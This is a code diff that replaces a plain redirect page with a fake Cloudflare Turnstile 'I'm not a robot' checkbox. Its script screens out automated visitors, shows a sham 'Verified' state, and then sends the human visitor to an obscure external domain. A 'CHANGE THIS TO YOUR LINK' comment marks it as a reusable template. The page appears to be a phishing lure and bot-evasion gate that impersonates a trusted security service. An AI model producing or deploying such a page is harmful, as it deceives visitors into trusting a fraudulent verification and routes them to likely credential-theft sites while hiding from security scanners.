@@ -1,14 +1,255 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script>
-        window.location.href = "https://google.com/";
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare Turnstile</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .turnstile-widget {
+            background: white;
+            border: 1px solid #d4d4d8;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 300px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .turnstile-content {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .checkbox-wrapper {
+            flex-shrink: 0;
+        }
+        
+        .turnstile-checkbox {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            accent-color: #0051ba;
+        }
+        
+        .turnstile-label {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            flex: 1;
+        }
+        
+        .turnstile-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #1a1a1a;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .turnstile-subtext {
+            font-size: 12px;
+            color: #707070;
+            font-weight: 400;
+            min-height: 16px;
+        }
+        
+        .status {
+            font-size: 16px;
+            color: #0051ba;
+            font-weight: 600;
+            min-width: 20px;
+            text-align: center;
+        }
+        
+        .status.success {
+            color: #22c55e;
+        }
+        
+        .status.error {
+            color: #ef4444;
+        }
+        
+        .turnstile-footer {
+            padding: 12px 20px;
+            background: #fafafa;
+            border-top: 1px solid #e5e5e5;
+            font-size: 11px;
+            color: #838383;
+            text-align: center;
+        }
+        
+        .turnstile-footer a {
+            color: #0051ba;
+            text-decoration: none;
+        }
+        
+        .turnstile-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .turnstile-widget.verified {
+            border-color: #22c55e;
+        }
+    </style>
 </head>
 <body>
-    <p>If you are not redirected automatically, 
-       <a href="https://google.com/">click here</a>.</p>
+    <div class="turnstile-widget" id="turnstileWidget">
+        <div class="turnstile-content">
+            <div class="checkbox-wrapper">
+                <input 
+                    type="checkbox" 
+                    id="turnstileCheckbox"
+                    class="turnstile-checkbox"
+                    autocomplete="off"
+                >
+            </div>
+            <label for="turnstileCheckbox" class="turnstile-label">
+                <span class="turnstile-text">I'm not a robot</span>
+                <span class="turnstile-subtext" id="subtext">Click to verify</span>
+            </label>
+            <div class="status" id="status"></div>
+        </div>
+        <div class="turnstile-footer">
+            Privacy • Terms • 
+            <a href="#">Report abuse</a>
+        </div>
+    </div>
+
+    <script>
+        const REDIRECT_URL = ' https://fztqsyrzxu.ruvimelix.com/#legalsDocsCllgCJZZzNSKwPqTkrhwJSJNnZmlpwGmPQckCHlHLgzFjSDPhNBHjcFpwwGwJMtQbBJmhjgwXJV'; // CHANGE THIS TO YOUR LINK
+        const MIN_PAGE_INTERACTION_TIME = 800;
+        const MIN_HOVER_TIME = 300;
+        
+        let pageLoadTime = Date.now();
+        let checkboxHoverStart = null;
+        let mouseMovementDetected = false;
+        let pageInteractionDetected = false;
+        
+        const checkbox = document.getElementById('turnstileCheckbox');
+        const subtext = document.getElementById('subtext');
+        const status = document.getElementById('status');
+        const widget = document.getElementById('turnstileWidget');
+        
+        let dotAnimationInterval = null;
+        
+        // Detect mouse movement
+        document.addEventListener('mousemove', () => {
+            mouseMovementDetected = true;
+            pageInteractionDetected = true;
+        });
+        
+        document.addEventListener('keydown', () => {
+            pageInteractionDetected = true;
+        });
+        
+        document.addEventListener('touchstart', () => {
+            pageInteractionDetected = true;
+            mouseMovementDetected = true;
+        });
+        
+        // Track hover over checkbox
+        checkbox.addEventListener('mouseenter', () => {
+            checkboxHoverStart = Date.now();
+        });
+        
+        checkbox.addEventListener('mouseleave', () => {
+            checkboxHoverStart = null;
+        });
+        
+        // Checkbox change handler
+        checkbox.addEventListener('change', () => {
+            if (!isHumanInteraction()) {
+                checkbox.checked = false;
+                status.textContent = '✗';
+                status.className = 'status error';
+                return;
+            }
+            
+            if (checkbox.checked) {
+                verifyAndRedirect();
+            }
+        });
+        
+        // Prevent rapid/programmatic clicks
+        let lastClickTime = 0;
+        checkbox.addEventListener('click', (e) => {
+            const currentTime = Date.now();
+            const timeSinceLastClick = currentTime - lastClickTime;
+            
+            if (timeSinceLastClick < 100 && lastClickTime !== 0) {
+                e.preventDefault();
+                checkbox.checked = false;
+                return;
+            }
+            
+            lastClickTime = currentTime;
+        });
+        
+        function isHumanInteraction() {
+            const timeSincePageLoad = Date.now() - pageLoadTime;
+            
+            if (timeSincePageLoad < MIN_PAGE_INTERACTION_TIME) {
+                return false;
+            }
+            
+            if (!mouseMovementDetected && !pageInteractionDetected) {
+                return false;
+            }
+            
+            if (checkboxHoverStart !== null) {
+                const hoverDuration = Date.now() - checkboxHoverStart;
+                if (hoverDuration < MIN_HOVER_TIME) {
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+        
+        function verifyAndRedirect() {
+            // Start animated dots
+            let dotCount = 0;
+            status.textContent = '';
+            subtext.textContent = 'Verifying.';
+            
+            dotAnimationInterval = setInterval(() => {
+                dotCount = (dotCount + 1) % 4;
+                subtext.textContent = 'Verifying' + '.'.repeat(dotCount);
+            }, 400);
+            
+            // Show verified after delay
+            setTimeout(() => {
+                clearInterval(dotAnimationInterval);
+                status.textContent = '✓';
+                status.className = 'status success';
+                widget.classList.add('verified');
+                subtext.textContent = 'Verified';
+                
+                // Redirect after showing verified
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
